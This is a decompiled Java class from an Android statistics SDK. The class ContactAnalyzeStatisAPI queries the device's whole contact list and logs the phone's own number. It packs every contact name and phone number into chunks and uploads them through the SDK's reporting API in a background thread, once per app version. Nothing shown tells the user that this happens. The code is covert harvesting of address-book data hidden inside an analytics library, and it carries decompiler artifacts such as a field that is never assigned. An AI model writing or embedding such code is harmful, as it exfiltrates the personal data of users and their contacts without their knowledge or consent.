package com.yy.hiidostatis.defs.controller;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.yy.hiidostatis.defs.interf.IStatisAPI;
import com.yy.hiidostatis.defs.obj.Elem;
import com.yy.hiidostatis.inner.util.DefaultPreference;
import com.yy.hiidostatis.inner.util.ThreadPool;
import com.yy.hiidostatis.inner.util.Util;
import com.yy.hiidostatis.inner.util.log.C1923L;

import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ContactAnalyzeStatisAPI {
    private static final int CONTACT_ID_INDEX = 2;
    private static final int DISPLAY_NAME_INDEX = 0;
    private static final int NUMBER_INDEX = 1;
    private static final String[] PHONES_PROJECTION = new String[]{"display_name", "data1", "contact_id"};
    private static final String PREF_KEY_CONTACT_REPORT_VER = "PREF_KEY_CONTACT_REPORT_VER";
    private IStatisAPI statisAPI;
    private String r2;

    class Contact {
        long contactId;
        String name;
        String number;

        private Contact() {
        }

        public String toString() {
            return this.contactId + Elem.DIVIDER + this.name + Elem.DIVIDER + this.number;
        }
    }

    public ContactAnalyzeStatisAPI(IStatisAPI iStatisAPI) {
        this.statisAPI = iStatisAPI;
    }

    private String[] formatContacts(List<Contact> list) {
        String stringBuffer;
        Map hashMap = new HashMap();
        C1923L.brief("contact：before=%d", Integer.valueOf(list.size()));
        for (Contact contact : list) {
            String str = contact.number;
            if (!(str == null || str.length() == 0)) {
                String replaceAll = str.replaceAll(" ", "").replaceAll("-", "").replaceAll(",", "");
                Contact contact2 = (Contact) hashMap.get(Long.valueOf(contact.contactId));
                if (contact2 == null) {
                    contact.number = replaceAll;
                    hashMap.put(Long.valueOf(contact.contactId), contact);
                } else {
                    contact2.number += "," + replaceAll;
                    hashMap.put(Long.valueOf(contact.contactId), contact2);
                }
            }
        }
        C1923L.brief("contact：after=%d", Integer.valueOf(hashMap.size()));
        List arrayList = new ArrayList();
        StringBuffer stringBuffer2 = new StringBuffer();
        Collection<Contact> con = hashMap.values();
        for (Contact contact3 : con) {
            if (stringBuffer2.length() > 0) {
                stringBuffer2.append("|");
            }
            stringBuffer2.append(contact3.name).append(Elem.DIVIDER).append(contact3.number);
            if (stringBuffer2.length() > 2048) {
                stringBuffer = stringBuffer2.toString();
                stringBuffer2.setLength(0);
                arrayList.add(stringBuffer);
            }
        }
        stringBuffer = stringBuffer2.toString();
        stringBuffer2.setLength(0);
        arrayList.add(stringBuffer);
        return (String[]) arrayList.toArray(new String[arrayList.size()]);
    }

    private List<Contact> getContacts(Context context) {
        Cursor query = context.getContentResolver().query(Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
        if (query == null) {
            return null;
        }
        C1923L.brief("contact = %d", Integer.valueOf(query.getCount()));
        List<Contact> arrayList = new ArrayList();
        while (query.moveToNext()) {
            Contact contact = new Contact();
            contact.contactId = query.getLong(2);
            contact.name = query.getString(0);
            contact.number = query.getString(1);
            if (contact.number == null || contact.number.trim().length() == 0) {
                C1923L.brief("contact =number is empty", new Object[0]);
            } else {
                arrayList.add(contact);
            }
        }
        return arrayList;
    }

    private void startContactAnalyzeReport(final Context context, final long j) {
        ThreadPool.getPool().execute(new Runnable() {
            public void run() {
                try {
                    C1923L.brief("contact no = %s", Util.getLine1Number(context));
                    List access$000 = ContactAnalyzeStatisAPI.this.getContacts(context);
                    if (access$000 == null || access$000.size() == 0) {
                        C1923L.brief("contacts is empty", new Object[0]);
                        return;
                    }
                    String[] access$100 = ContactAnalyzeStatisAPI.this.formatContacts(access$000);
                    if (access$100 == null || access$100.length == 0) {
                        C1923L.brief("formatContacts is empty", new Object[0]);
                        return;
                    }
                    for (String reportccList : access$100) {
                        ContactAnalyzeStatisAPI.this.statisAPI.reportccList(j, r2, reportccList);
                    }
                } catch (Exception e) {
                    C1923L.error(this, "startContactAnalyzeReport error=%s", e);
                }
            }
        });
    }

    public void reportContactAnalyze(Context context, long j) {
        try {
            int prefInt = DefaultPreference.getPreference().getPrefInt(context, PREF_KEY_CONTACT_REPORT_VER, -1);
            int versionNo = Util.getVersionNo(context);
            if (prefInt != -1 && prefInt == versionNo) {
                C1923L.brief("reportContactAnalyze reported ver=%s", Integer.valueOf(prefInt));
            } else if (Util.checkPermissions(context, "android.permission.READ_CONTACTS")) {
                startContactAnalyzeReport(context, j);
                DefaultPreference.getPreference().setPrefInt(context, PREF_KEY_CONTACT_REPORT_VER, versionNo);
            } else {
                C1923L.warn(this, "reportContactAnalyze report failed,no permission", new Object[0]);
            }
        } catch (Exception e) {
            C1923L.error(this, "reportContactAnalyze error=%s", e);
        }
    }
}
